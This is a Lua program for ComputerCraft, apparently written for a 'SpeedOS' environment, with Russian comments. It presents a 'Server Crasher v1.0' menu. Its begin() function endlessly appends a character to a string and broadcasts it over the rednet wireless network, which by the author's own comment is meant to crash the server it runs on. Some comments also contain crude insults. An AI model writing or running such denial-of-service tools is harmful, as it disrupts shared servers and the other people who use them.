-----------------------------------------------------------------------------------------------------------------------------------
-- Меняем цвет верхнего тулбара

if SpeedOS then
  SpeedOS.ToolBarColour = colours.lightGrey 
  SpeedOS.ToolBarTextColour = colours.white
end

-----------------------------------------------------------------------------------------------------------------------------------
-- Подгружаем АПИ для работы программы

SpeedOS.LoadAPI("SpeedAPI/SpeedGUI")
SpeedOS.LoadAPI("SpeedAPI/SpeedText")
SpeedOS.LoadAPI("SpeedAPI/windows")
SpeedOS.LoadAPI("SpeedAPI/peripheral")

-----------------------------------------------------------------------------------------------------------------------------------
-- Информирование пользователя о том, что для работы программы ему потребуется беспроводной модем для доступа к rednet-сети

if not peripheral.find("modem") then -- в случае, если инвертированный результат проверки "подключён ли модем к компьютеру" равен true
  windows.clearScreen(colors.lightBlue) -- чистим экран в светло-синий(голубой блять неэрудированный ты петух!)
  windows.error("This program requires wireless modem!") -- АШИБКА
  SpeedOS.Close() -- закрываем программу
end

-----------------------------------------------------------------------------------------------------------------------------------
-- Открываем модем с найденной стороны

rednet.open(peripheral.find("modem"))

-----------------------------------------------------------------------------------------------------------------------------------
-- То, как будет выглядеть наша строка, к которой будет добавляться символ "-"

local _string = ""

-----------------------------------------------------------------------------------------------------------------------------------
-- Основной цикл программы. Добавляем к строке "-" бесконечно много раз, что в результате приведет к крашу сервера, на котором запущена программа.

function begin()
  while true do
    _string = _string.."-"
    rednet.broadcast(_string) -- атправляим
  end
end

-----------------------------------------------------------------------------------------------------------------------------------
-- Главное меню программы

windows.clearScreen(colors.cyan)
SpeedText.cPrint("Server Crasher v1.0", 2)
SpeedText.line()

SpeedGUI.gui.button.add("     Begin!     ", begin, SpeedText.cCursor("      Begin!      ")[1], 6, 2, 3, colors.white, colors.lightBlue)
SpeedGUI.gui.button.add("      Exit      ", SpeedOS.Close, SpeedText.cCursor("       Exit       ")[1], 10, 2, 3, colors.white, colors.blue)
SpeedGUI.start()

-----------------------------------------------------------------------------------------------------------------------------------
